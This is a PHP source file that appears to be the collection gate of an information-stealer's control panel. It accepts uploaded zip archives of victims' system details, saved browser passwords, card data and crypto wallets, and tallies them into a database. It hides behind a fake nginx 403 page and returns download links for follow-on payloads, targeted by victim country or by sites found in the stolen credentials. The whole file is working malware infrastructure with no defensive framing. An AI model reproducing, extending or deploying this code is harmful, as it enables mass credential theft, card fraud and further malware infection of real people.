<?php

// -------------------------------------------------------------------------
// ini sets
ini_set("upload_max_filesize", "2048M");
ini_set("post_max_size", "2048M");

// -------------------------------------------------------------------------
// Include config and geoip data
require("Configs/Main.Config.php");
require('GeoIP/geoip.php');

// -------------------------------------------------------------------------
// blacklist of load files	
if(!preg_match("/.zip\$/i", $_FILES['file']['name']))
{
	?><html><head><title>403 Forbidden</title></head><body><center><h1>403 Forbidden</h1></center><hr><center>nginx</center></body></html><?
	exit(0);
}

// -------------------------------------------------------------------------
// db
$db = mysqli_connect($config["main"]["mysql_server"], $config["main"]["mysql_user"], $config["main"]["mysql_password"], $config["main"]["mysql_dbname"]);

if ($db->connect_errno)
{
	?><html><head><title>403 Forbidden</title></head><body><center><h1>403 Forbidden</h1></center><hr><center>nginx</center></body></html><?
	exit(0);
}

// -------------------------------------------------------------------------
// information about client
$IP = $_SERVER["REMOTE_ADDR"];
$Country = ip_code($IP) == "?" ? "UNK" : ip_code($IP);

$DateAdded = date("Y-m-d H:i:s");

$File = $config["main"]["LogsFolder"] ."/". basename($_FILES['file']['name']);
$FileName = $_FILES['file']['name'];

// -------------------------------------------------------------------------
// counts
$CountPass = 0;
$CountCC = 0;
$CountCrypto = 0;

$CountChromium = 0;
$CountFirefox = 0;
$CountIE = 0;
$CountEdge = 0;
$CountOpera = 0;

$passwords = "";
$system = "";

// -------------------------------------------------------------------------
// upload file to server
if (move_uploaded_file($_FILES['file']['tmp_name'], $File))
{
	$OS = "Unknown";
	$Bit = "Unknown";
	$Username = "Unknown";
	$MachineID = "Unknown";
	
	$zip = new ZipArchive;
	$reading = "";
	
	// -------------------------------------------------------------------------
	// file successful load to server
	if ($zip->open(realpath($File)) === TRUE) 
	{
		// -------------------------------------------------------------------------
		// user info
		$system = $zip->getFromName("system.txt");
		$sysinfo = explode("\n", $system);
		$count = 1;
		
		foreach($sysinfo as $line)
		{
			switch($count)
			{
				case 2:
					$OS = substr($line, 9);
					break;
						
				case 3:
					$Bit = substr($line, 5);
					break;
						
				case 4:
					$Username = substr($line, 6);
					break;
						
				case 7:
					$MachineID = substr($line, 12);
					break;
			}
			
			$count++;
		}
		
		// -------------------------------------------------------------------------
		// Add network info into system.txt
		$system = str_ireplace("IP?", $IP, $system);
		$system = str_ireplace("Country?", $Country, $system);
		
		$zip->addFromString('system.txt', $system);
		
		// -------------------------------------------------------------------------
		// Stats
		$passwords = $zip->getFromName("passwords.txt");
		$CountPass = substr_count($passwords, "SOFT:");
		
		// -------------------------------------------------------------------------
		// chromium passwords count
		$CountChromium = substr_count($passwords, ": Google Chrome") +
			substr_count($passwords, ": Chromium") +
			substr_count($passwords, ": Kometa") +
			substr_count($passwords, ": Amigo") +
			substr_count($passwords, ": Torch") +
			substr_count($passwords, ": Orbitum") +
			substr_count($passwords, ": Comodo Dragon") +
			substr_count($passwords, ": Nichrome") +
			substr_count($passwords, ": Maxthon5") +
			substr_count($passwords, ": Sputnik") +
			substr_count($passwords, ": EPB") +
			substr_count($passwords, ": Vivaldi") +
			substr_count($passwords, ": CocCoc Browser") +
			substr_count($passwords, ": Uran Browser") +
			substr_count($passwords, ": QIP Surf") +
			substr_count($passwords, ": Cent") +
			substr_count($passwords, ": Elements Browser") +
			substr_count($passwords, ": TorBrowser");
		
		// -------------------------------------------------------------------------
		// firefox passwords count
		$CountFirefox = substr_count($passwords, ": Mozilla Firefox") +
			substr_count($passwords, ": Pale Moon") +
			substr_count($passwords, ": Waterfox") +
			substr_count($passwords, ": Cyberfox") +
			substr_count($passwords, ": Black Hawk") +
			substr_count($passwords, ": IceCat") +
			substr_count($passwords, ": K-Meleon");
		
		// -------------------------------------------------------------------------
		// other passwords count
		$CountIE = substr_count($passwords, ": Internet Explorer");
		$CountEdge = substr_count($passwords, ": Microsoft Edge");
		$CountOpera = substr_count($passwords, ": Opera");
		
		// -------------------------------------------------------------------------
		// top sites count
		$sites = explode("\n", $passwords);
		
		foreach($sites as $line)
		{
			$l = substr($line, 0, 6);
			
			if($l == "HOST: ")
			{
				$url = parse_url(substr($line, 6));
				
				$url_r = $url['host'];
				
				$db->query("INSERT INTO `topsites` (`Host`, `Count`) VALUES('$url_r', '1') ON DUPLICATE KEY UPDATE `Count`=`Count`+1");
			}
		}
		
		// -------------------------------------------------------------------------
		// cc and crypto count
		$countFilesInLog = $zip->numFiles;
		
		for ($i = 0; $i < $count; $i++)
		{
			$stat = $zip->statIndex($i);
			$found = strripos($stat['name'], "cc/");
			
			if($found === false){}else
			{
				$ccFile = $zip->getFromName($stat["name"]);
				
				$CountCC = $CountCC + substr_count($ccFile, "CARD: ");
			}
			
			$found = strripos($stat['name'], "crypto/");
			if($found === false){}else
			{
				$CountCrypto++;
			}
		}
	}
	
	$zip->close();
	
	// -------------------------------------------------------------------------
	// Rename file
	$new_FileName = sprintf("%s_%s_%s.zip", $Country, mb_substr($MachineID, 0, -1), date("dmo_H_i_s"));
	rename($File, $config["main"]["LogsFolder"]."/".$new_FileName);
	
	$FileName = $new_FileName;
	
	// -------------------------------------------------------------------------
	// check duplicate
	$logs = $db->query("SELECT * FROM `logs` WHERE `MachineID`='$MachineID'");
	$Duplicate = 0;
	
	while ($log = $logs->fetch_assoc())
	{
		$Duplicate = 1;
	}
	
	$allow_duplicates = $db->query("SELECT * FROM `settings` WHERE `Name`='allow_duplicates'")->fetch_array();
		
	if($allow_duplicates["Value"] == 0)
	{
		if($Duplicate == 1)
		{
			unlink(realpath($File));
			
			exit(0);
		}
	}
	
	// -------------------------------------------------------------------------
	// adding information into database
	$db->query("INSERT INTO `logs`(`IP`, `Country`, `DateAdded`, `FileName`, `MachineID`, `WinUser`, `WinVer`, `WinBit`, `Passwords`, `System`, `CountPass`, `CountCards`, `CountCrypto`, `Duplicate`, `Comment`) VALUES ('$IP','$Country','$DateAdded','$FileName','$MachineID','$Username','$OS','$Bit','$passwords','$system','$CountPass','$CountCC','$CountCrypto','$Duplicate','')");
	
	$db->query("UPDATE `statistics` SET `Logs`=`Logs`+1");
	$db->query("UPDATE `statistics` SET `Passwords`=`Passwords`+$CountPass");
	$db->query("UPDATE `statistics` SET `Chromium`=`Chromium`+$CountChromium");
	$db->query("UPDATE `statistics` SET `Firefox`=`Firefox`+$CountFirefox");
	$db->query("UPDATE `statistics` SET `IE`=`IE`+$CountIE");
	$db->query("UPDATE `statistics` SET `Edge`=`Edge`+$CountEdge");
	$db->query("UPDATE `statistics` SET `Opera`=`Opera`+$CountOpera");
	
	$db->query("UPDATE `statitics_countries` SET `Count`=`Count`+1 WHERE `Code`='$Country'");
	
	// ===============================================================================================================================================

	// -------------------------------------------------------------------------
	// loader tasks checker
	$loader = $db->query("SELECT * FROM `loader` WHERE `Status`='1' ORDER BY `UID` DESC LIMIT 100;");
	$successTask = false;
	
	while ($task = $loader->fetch_assoc())
	{
		$taskID = $task["UID"];
		
		if($successTask)
		{
			exit;
		}
		
		if($task["DisabledCountries"] != "null")
		{
			$countries = explode(",", $task["DisabledCountries"]);
			
			foreach ($countries as $_country)
			{
				if($_country == $Country)
				{
					goto end_cycle;
				}
			}
		}
		
		if($task["Countries"] == "*")
		{
			if($task["Domains"] == "*")
			{
				if($task["Success"] + 1 == $task["Count"])
				{
					$db->query("UPDATE `loader` SET `Status`='2' WHERE `UID`='$taskID'");
				}
				
				$db->query("UPDATE `loader` SET `Success`=`Success` + 1 WHERE `UID`='$taskID'");
				
				echo $task["Link"];
				$successTask = true;
			}
			else
			{
				$domains = explode(",", $task["Domains"]);
				
				foreach ($domains as $domain)
				{
					if(substr_count($passwords, $domain) > 0)
					{
						if($task["Success"] + 1 == $task["Count"])
						{
							$db->query("UPDATE `loader` SET `Status`='2' WHERE `UID`='$taskID'");
						}
						
						$db->query("UPDATE `loader` SET `Success`=`Success` + 1 WHERE `UID`='$taskID'");
						
						echo $task["Link"];
						$successTask = true;
						break;
					}
				}
			}
		}
		else
		{
			$countries = explode(",", $task["Countries"]);
			
			foreach ($countries as $_country)
			{
				if($_country == $Country)
				{
					if($task["Domains"] == "*")
					{
						if($task["Success"] + 1 == $task["Count"])
						{
							$db->query("UPDATE `loader` SET `Status`='2' WHERE `UID`='$taskID'");
						}
						
						$db->query("UPDATE `loader` SET `Success`=`Success` + 1 WHERE `UID`='$taskID'");
						
						echo $task["Link"];
						$successTask = true;
					}
					else
					{
						$domains = explode(",", $task["Domains"]);
						
						foreach ($domains as $domain)
						{
							if(substr_count($passwords, $domain) > 0)
							{
								if($task["Success"] + 1 == $task["Count"])
								{
									$db->query("UPDATE `loader` SET `Status`='2' WHERE `UID`='$taskID'");
								}
								
								$db->query("UPDATE `loader` SET `Success`=`Success` + 1 WHERE `UID`='$taskID'");
								
								echo $task["Link"];
								$successTask = true;
								break;
							}
						}
					}
				}
			}
		}
		
		end_cycle:
	}
}
else
{
	?><html><head><title>403 Forbidden</title></head><body><center><h1>403 Forbidden</h1></center><hr><center>nginx</center></body></html><?
	exit(0);
}

?>